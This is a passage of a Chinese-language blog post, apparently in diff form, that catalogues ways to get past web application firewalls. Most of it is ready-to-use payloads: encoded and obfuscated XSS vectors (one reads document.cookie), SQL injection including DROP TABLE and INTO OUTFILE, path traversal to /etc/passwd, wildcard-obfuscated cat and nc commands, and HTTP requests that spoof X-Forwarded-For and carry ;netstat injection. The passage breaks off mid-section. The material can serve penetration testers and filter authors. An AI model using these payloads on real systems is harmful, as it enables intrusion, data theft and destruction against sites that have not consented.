+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Blocked</span>: &lt;svG/x="&gt;"/oNloaD=confirm()//</span><br><span class="line"><span class="attribute">Bypassed</span>: %3CsvG%2Fx%3D%22%3E%22%2FoNloaD%3Dconfirm%28%29%2F%2F</span><br><span class="line"><span class="attribute">Blocked</span>: uNIoN(sEleCT 1,2,3,4,5,6,7,8,9,10,11,12)</span><br><span class="line"><span class="attribute">Bypassed</span>: uNIoN%28sEleCT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%29</span><br></pre></td></tr></table></figure>
+
+<h4 id="Unicode规范化"><a href="#Unicode规范化" class="headerlink" title="Unicode规范化"></a>Unicode规范化</h4><ul>
+<li>unicode编码编码的ASCII字符为绕过提供了很大的Bapass</li>
+<li>您可以对整个/部分有效载荷进行编码以获得结果</li>
+</ul>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Standard</span>: &lt;marquee onstart=prompt()&gt;</span><br><span class="line"><span class="attribute">Obfuscated</span>: &lt;marquee onstart=\u0070r\u06f\u006dpt()&gt;</span><br><span class="line"><span class="attribute">Blocked</span>: /?redir=http://google.com</span><br><span class="line"><span class="attribute">Bypassed</span>: /?redir=http://google。com (Unicode替代)</span><br><span class="line"><span class="attribute">Blocked</span>: &lt;marquee loop=1 onfinish=alert()&gt;x</span><br><span class="line"><span class="attribute">Bypassed</span>: ＜marquee loop＝1 onfinish＝alert︵1)&gt;x (Unicode替代)</span><br><span class="line"><span class="attribute">Standard</span>: ../../etc/passwd</span><br><span class="line"><span class="attribute">Obfuscated</span>: %C0AE%C0AE%C0AF%C0AE%C0AE%C0AFetc%C0AFpasswd</span><br></pre></td></tr></table></figure>
+
+<h4 id="HTML-Representation"><a href="#HTML-Representation" class="headerlink" title="HTML Representation"></a>HTML Representation</h4><ul>
+<li>通常，网络应用会将特殊字符编码为HTML编码，并相应地进行渲染.</li>
+</ul>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Standard</span>: "&gt;&lt;img src=x onerror=confirm()&gt;</span><br><span class="line"><span class="attribute">Encoded</span>: &amp;quot;&gt;&lt;img src=x onerror=confirm&amp;lpar;&amp;rpar;&gt; (一般形式)</span><br><span class="line"><span class="attribute">Encoded</span>: &amp;#34;&amp;#62;&amp;#60;img src=x onerror=confirm&amp;#40;&amp;#41;&amp;#62; (html编码)</span><br></pre></td></tr></table></figure>
+
+<h4 id="混合编码"><a href="#混合编码" class="headerlink" title="混合编码"></a><strong>混合编码</strong></h4><ul>
+<li>有时，WAF规则通常倾向于滤除特定类型的编码.</li>
+<li>混合编码有效载荷可以绕过这种类型的过滤器.</li>
+<li>制表符和换行符进一步增加了混淆.</li>
+</ul>
+<p><strong>Obfuscated</strong>:</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;A HREF="h</span><br><span class="line">tt  p://6   6.000146.0x7.147/"&gt;XSS&lt;/A&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="使用注释"><a href="#使用注释" class="headerlink" title="使用注释"></a><strong>使用注释</strong></h4><ul>
+<li>注释混淆标准有效载荷向量.</li>
+<li>不同的有效载荷具有不同的混淆方式.</li>
+</ul>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Blocked</span>: &lt;script&gt;alert()&lt;/script&gt;</span><br><span class="line"><span class="attribute">Bypassed</span>: &lt;!--&gt;&lt;script&gt;alert/**/()/**/&lt;/script&gt;</span><br><span class="line"><span class="attribute">Blocked</span>: /?id=1+union+select+1,2,3--</span><br><span class="line"><span class="attribute">Bypassed</span>: /?id=1+un/**/ion+sel/**/ect+1,2,3--</span><br></pre></td></tr></table></figure>
+
+<h4 id="双重编码"><a href="#双重编码" class="headerlink" title="双重编码"></a><strong>双重编码</strong></h4><ul>
+<li>通常，WAF过滤器倾向于对字符进行编码以防止攻击.</li>
+<li>但是，开发不完善的过滤器（没有递归过滤器）可以使用双重编码来绕过.</li>
+</ul>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Standard</span>: http://victim/cgi/../../winnt/system32/cmd.exe?/c+dir+c:\</span><br><span class="line"><span class="attribute">Obfuscated</span>: http://victim/cgi/%252E%252E%252F%252E%252E%252Fwinnt/system32/cmd.exe?/c+dir+c:\</span><br><span class="line"><span class="attribute">Standard</span>: &lt;script&gt;alert()&lt;/script&gt;</span><br><span class="line"><span class="attribute">Obfuscated</span>: %253Cscript%253Ealert()%253C%252Fscript%253E</span><br></pre></td></tr></table></figure>
+
+<h4 id="通配混淆"><a href="#通配混淆" class="headerlink" title="通配混淆"></a><strong>通配混淆</strong></h4><ul>
+<li>各种命令行实用程序都使用通配符模式来处理多个文件.</li>
+<li>我们可以调整它们以执行系统命令.</li>
+<li>特定于linux系统上的远程执行代码漏洞.</li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Standard</span>: /bin/cat /etc/passwd</span><br><span class="line"><span class="attribute">Obfuscated</span>: /???/??t /???/??ss??</span><br><span class="line">Used chars: / ? t s</span><br><span class="line"><span class="attribute">Standard</span>: /bin/nc 127.0.0.1 1337</span><br><span class="line"><span class="attribute">Obfuscated</span>: /???/n? 2130706433 1337</span><br><span class="line">Used chars: / ? n [0-9]</span><br></pre></td></tr></table></figure>
+
+<h4 id="动态有效载荷生成"><a href="#动态有效载荷生成" class="headerlink" title="动态有效载荷生成"></a><strong>动态有效载荷生成</strong></h4><ul>
+<li>不同的编程语言具有不同的连接语法和模式.</li>
+<li>这使我们能够有效地生成可以绕过许多过滤器和规则的有效载荷.</li>
+</ul>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Standard</span>: &lt;script&gt;alert()&lt;/script&gt;</span><br><span class="line"><span class="attribute">Obfuscated</span>: &lt;script&gt;eval('al'+'er'+'t()')&lt;/script&gt;</span><br><span class="line"><span class="attribute">Standard</span>: /bin/cat /etc/passwd</span><br><span class="line"><span class="attribute">Obfuscated</span>: /bi'n'''/c''at' /e'tc'/pa''ss'wd</span><br><span class="line"><span class="attribute">Standard</span>: &lt;iframe/onload='this["src"]="javascript:alert()"';&gt;</span><br><span class="line"><span class="attribute">Obfuscated</span>: &lt;iframe/onload='this["src"]="jav"+"as&amp;Tab;cr"+"ipt:al"+"er"+"t()"';&gt;</span><br></pre></td></tr></table></figure>
+
+<p>根据这个思路，我们可以继续向其延申</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=self[`al`+`ert`]`1`&gt;</span><br><span class="line">&lt;svg/onload=window[`al`+`ert`]`1`&gt;</span><br><span class="line">&lt;svg/onload=parent[`al`+`ert`]`1`&gt;</span><br><span class="line">&lt;svg/onload=self[`al`+`ert`]`1`&gt;</span><br><span class="line">&lt;svg/onload=top[`al`+`ert`]`1`&gt;</span><br><span class="line">&lt;svg/onload=frames[`al`+`ert`]`1`&gt;</span><br><span class="line">&lt;svg/onload=self.frames[`al`+`ert`]`1`&gt;</span><br><span class="line">&lt;svg/onload=self.top[`al`+`ert`]`1`&gt;</span><br><span class="line">&lt;svg/onload=self.self[`al`+`ert`]`1`&gt;</span><br><span class="line">&lt;svg/onload=self.parent[`al`+`ert`]`1`&gt;</span><br><span class="line">&lt;svg/onload=self.window[`al`+`ert`]`1`&gt;</span><br><span class="line">&lt;svg/onload=top[`al`+`ert`](`docu`+`ment.cookie`)&gt;</span><br><span class="line">&lt;svg/onload=self[`aler`+`t`]`1`&gt;</span><br><span class="line">&lt;svg/onload=self[`al`+`ert`]`1`&gt;</span><br><span class="line">&lt;svg/onload=self[`al`%2b`ert`]`1`&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="垃圾字符"><a href="#垃圾字符" class="headerlink" title="垃圾字符"></a><strong>垃圾字符</strong></h4><ul>
+<li>正常的有效载荷很容易被过滤掉.</li>
+<li>添加一些垃圾字符有助于避免检测（仅限特定情况）.</li>
+<li>它们通常有助于混淆基于正则表达式的防火墙.</li>
+</ul>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Standard</span>: &lt;script&gt;alert()&lt;/script&gt;</span><br><span class="line"><span class="attribute">Obfuscated</span>: &lt;script&gt;+-+-1-+-+alert(1)&lt;/script&gt;</span><br><span class="line"><span class="attribute">Standard</span>: &lt;BODY onload=alert()&gt;</span><br><span class="line"><span class="attribute">Obfuscated</span>: &lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^=alert()&gt;`</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>NOTE:</strong> 上面的有效负载可能会破坏正则表达式解析器，从而导致异常.</p>
+</blockquote>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Standard</span>: &lt;a href=javascript;alert()&gt;ClickMe</span><br><span class="line"><span class="attribute">Bypassed</span>: &lt;a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=j&amp;#97v&amp;#97script&amp;#x3A;&amp;#97lert(1)&gt;ClickMe</span><br></pre></td></tr></table></figure>
+
+<h4 id="换行符"><a href="#换行符" class="headerlink" title="换行符"></a><strong>换行符</strong></h4><ul>
+<li>许多具有基于正则表达式的WAF可以有效地阻止许多尝试.</li>
+<li>换行符（CR / LF）可以破坏防火墙的正则表达式并绕过某些东西.</li>
+</ul>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Standard</span>: &lt;iframe src=javascript:confirm(0)"&gt;</span><br><span class="line"><span class="attribute">Obfuscated</span>: &lt;iframe src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(0)"&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="未初始化的变量"><a href="#未初始化的变量" class="headerlink" title="未初始化的变量"></a><strong>未初始化的变量</strong></h4><ul>
+<li>初始化的bash变量可以规避基于正则表达式的错误过滤器和模式匹配.</li>
+<li>它们的值等于null /它们的作用类似于空字符串.</li>
+<li>bash和perl都允许这种解释.</li>
+<li>变量名称可以具有任意数量的随机字符。我在这里将它们表示为$ aaaaaa，$ bbbbbb等。您可以将它们替换为任意数量的随机字符，例如$ ushdjah等 .</li>
+</ul>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">- Level 1 混淆: Normal</span><br><span class="line">  <span class="attribute">Standard</span>: /bin/cat /etc/passwd</span><br><span class="line">  <span class="attribute">Obfuscated</span>: /bin/cat$u /etc/passwd$u</span><br><span class="line">- Level 2 混淆: Postion Based</span><br><span class="line">  <span class="attribute">Standard</span>: /bin/cat /etc/passwd</span><br><span class="line">  <span class="attribute">Obfuscated</span>: $u**/bin**$u**/cat**$u $u**/etc**$u**/passwd**$u</span><br><span class="line">- Level 3 混淆: Random characters</span><br><span class="line">  <span class="attribute">Standard</span>: /bin/cat /etc/passwd</span><br><span class="line">  <span class="attribute">Obfuscated</span>: $aaaaaa**/bin**$bbbbbb**/cat**$ccccccc $dddddd**/etc**$eeeeeee**/passwd**$fffffff</span><br></pre></td></tr></table></figure>
+
+<p>精心制作的payload:</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sdijchkd/???$sdjhskdjh/??t$skdjfnskdj $sdofhsdhjs/???$osdihdhsdj/??ss??$skdjhsiudf</span><br></pre></td></tr></table></figure>
+
+<h4 id="制表符和换行符"><a href="#制表符和换行符" class="headerlink" title="制表符和换行符"></a><strong>制表符和换行符</strong></h4><ul>
+<li>选项卡通常有助于规避防火墙，尤其是基于正则表达式的防火墙.</li>
+<li>当正则表达式需要空格而不是制表符时，制表符可以帮助打破防火墙正则表达式.</li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Standard</span>: &lt;IMG SRC="javascript:alert();"&gt;</span><br><span class="line"><span class="attribute">Bypassed</span>: &lt;IMG SRC=" javascript:alert();"&gt;</span><br><span class="line"><span class="attribute">Variant</span>: &lt;IMG SRC=" jav ascri pt:alert ();"&gt;</span><br><span class="line"><span class="attribute">Standard</span>: http://test.com/test?id=1 union select 1,2,3</span><br><span class="line"><span class="attribute">Standard</span>: http://test.com/test?id=1%09union%23%0A%0Dselect%2D%2D%0A%0D1,2,3</span><br><span class="line"><span class="attribute">Standard</span>: &lt;iframe src=javascript:alert(1)&gt;&lt;/iframe&gt;</span><br><span class="line">Obfuscated:&lt;iframe    src=j&amp;Tab;a&amp;Tab;v&amp;Tab;a&amp;Tab;s&amp;Tab;c&amp;Tab;r&amp;Tab;i&amp;Tab;p&amp;Tab;t&amp;Tab;:a&amp;Tab;l&amp;Tab;e&amp;Tab;r&amp;Tab;t&amp;Tab;%28&amp;Tab;1&amp;Tab;%29&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="令牌破坏者"><a href="#令牌破坏者" class="headerlink" title="令牌破坏者"></a><strong>令牌破坏者</strong></h4><ul>
+<li>对令牌生成器的攻击试图打破在令牌破坏者的帮助下将请求拆分为令牌的逻辑.</li>
+<li>令牌破译器是允许影响字符串元素和某个令牌之间的对应关系的符号，从而绕过通过签名进行搜索.</li>
+<li>但是，在使用令牌断开器时，请求必须仍然有效.</li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- Case: Unknown Token for the Tokenizer</span><br><span class="line">  - Payload: ?id=‘-sqlite_version() UNION SELECT password FROM users --</span><br><span class="line">- Case: Unknown Context for the Parser (Notice the uncontexted bracket)</span><br><span class="line">  - Payload 1: ?id=123);DROP TABLE users --</span><br><span class="line">  - Payload 2: ?id=1337) INTO OUTFILE ‘xxx’ --</span><br></pre></td></tr></table></figure>
+
+<h3 id="burpsuit插件"><a href="#burpsuit插件" class="headerlink" title="burpsuit插件"></a>burpsuit插件</h3><blockquote>
+<p><a href="https://github.com/codewatchorg/bypasswaf" target="_blank" rel="noopener">https://github.com/codewatchorg/bypasswaf</a></p>
+</blockquote>
+<h4 id="X-Originating-IP"><a href="#X-Originating-IP" class="headerlink" title="X-Originating-IP"></a>X-Originating-IP</h4><blockquote>
+<p>用户可以修改在每个请求中发送的X-Originating-IP，X-Forwarded-For，X-Remote-IP，X-Remote-Addr头。 这可能是顶部绕过技术的工具。 将WAF配置为信任自己（127.0.0.1）或上游代理设备是常见的，这是此绕过目标。</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th align="left">原始请求</th>
+<th align="left">插件改变后</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">X-Originating-IP：原始IP</td>
+<td align="left">X-Originating-IP：127.0.0.1</td>
+</tr>
+<tr>
+<td align="left">X-Forwarded-For：原始IP</td>
+<td align="left">X-Forwarded-For：127.0.0.1</td>
+</tr>
+<tr>
+<td align="left">X-Remote-IP：原始IP</td>
+<td align="left">X-Remote-IP：127.0.0.1</td>
+</tr>
+<tr>
+<td align="left">X-Remote-Addr：原始IP</td>
+<td align="left">X-Remote-Addr：127.0.0.1</td>
+</tr>
+</tbody></table>
+<p>案例X-Originating-IP &gt; 127.0.0.1：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/get/?id=;netstat%20-ant</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 10.100.12.249:8080</span><br><span class="line"><span class="attribute">X-Originating-IP</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">X-Forwarded-For</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">X-Remote-IP</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">X-Remote-Addr</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">X-Client-IP</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">X-Forwarded-For:127.0.0.2</span></span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=B4640D0258CA8C041F8102EE58A1E76B</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure>
+
+<h4 id="Content-type"><a href="#Content-type" class="headerlink" title="Content-type"></a>Content-type</h4><blockquote>
+<p>“Content-Type”头部在每个请求中可以保持不变，从所有请求中删除，或者修改为每个请求的许多其他选项之一。 一些WAF将仅仅基于已知内容类型来解码/评估请求，这个特征针对该弱点。</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th align="left">原始请求</th>
+<th align="left">结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Content-Type：原始</td>
+<td align="left">Content-Type：原始</td>
+</tr>
+<tr>
+<td align="left">Content-Type：原始</td>
+<td align="left">删除Content-Type</td>
+</tr>
+<tr>
+<td align="left">Content-Type：原始</td>
+<td align="left">Content-Type: invalid</td>
+</tr>
+<tr>
+<td align="left">Content-Type：原始</td>
+<td align="left">Content-Type: example</td>
+</tr>
+<tr>
+<td align="left">Content-Type：原始</td>
+<td align="left">Content-Type: multipart/</td>
+</tr>
+<tr>
+<td align="left">Content-Type：原始</td>
+<td align="left">Content-Type: multipart/digest</td>
+</tr>
+<tr>
+<td align="left">Content-Type：原始</td>
+<td align="left">Content-Type: multipart/digest; boundary=0000</td>
+</tr>
+<tr>
+<td align="left">Content-Type：原始</td>
+<td align="left">Content-Type: multipart/; boundary=0000</td>
+</tr>
+</tbody></table>
+<p>案例：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/post_key/main.jsp</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 10.100.12.249:8080</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Typeapplication/x-www-form-urlencoded</span></span><br><span class="line"><span class="attribute">Referer</span>: http://10.100.12.249:8080/post_key/</span><br><span class="line"><span class="attribute">Content-Length</span>: 30</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=B4640D0258CA8C041F8102EE58A1E76B</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/; boundary=0000</span><br><span class="line"></span><br><span class="line">name=%3Bnetstat+-ant+&amp;pass=1</span><br></pre></td></tr></table></figure>
+
+<h4 id="Host"><a href="#Host" class="headerlink" title="Host"></a>Host</h4><blockquote>
+<p>也可以修改“主机”标题。 配置不当的WAF可能配置为仅根据此标头中找到的主机的正确FQDN来评估请求，这是此绕过目标。</p>
+</blockquote>
+<p>案例：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/post_key/main.jsp</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 改变这里</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Typeapplication/x-www-form-urlencoded</span></span><br><span class="line"><span class="attribute">Referer</span>: http://10.100.12.249:8080/post_key/</span><br><span class="line"><span class="attribute">Content-Length</span>: 30</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=B4640D0258CA8C041F8102EE58A1E76B</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/; boundary=0000</span><br><span class="line"></span><br><span class="line">name=%3Bnetstat+-ant+&amp;pass=1</span><br></pre></td></tr></table></figure>
+
+<h4 id="Pathinfo"><a href="#Pathinfo" class="headerlink" title="Pathinfo"></a>Pathinfo</h4><blockquote>
+<p>路径注入功能可以不修改请求，注入随机路径信息（/path/to/example.php/randomvalue?restofquery），或注入随机路径参数（/path/to/example.php;randomparam=randomvalue？ resetofquery）。 这可以用于绕过依赖于路径信息的编写不良的规则。</p>
+</blockquote>
+<ul>
+<li><p>原始请求</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/get/?id=;netstat%20-ant</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 10.100.12.249:8080</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=B4640D0258CA8C041F8102EE58A1E76B</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Pathinfoinjection</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/get//fhwa84a04vq8a0jnefo?id=;netstat%20-ant</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 10.100.12.249:8080</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=B4640D0258CA8C041F8102EE58A1E76B</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>PathParametwesinjection</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/get/;mhz=cpv?id=;netstat%20-ant</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 10.100.12.249:8080</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=B4640D0258CA8C041F8102EE58A1E76B</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> </span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h4 id="PathObfuscation"><a href="#PathObfuscation" class="headerlink" title="PathObfuscation"></a>PathObfuscation</h4><blockquote>
+<p>路径混淆功能将路径中的最后一个正斜杠修改为随机值，或者默认情况下不做任何操作。 最后一个斜杠可以修改为许多值中的一个，在许多情况下导致仍然有效的请求，但是可以绕过依赖于路径信息的写得不好的WAF规则。</p>
+</blockquote>
+<ul>
+<li><p>原始请求</p>
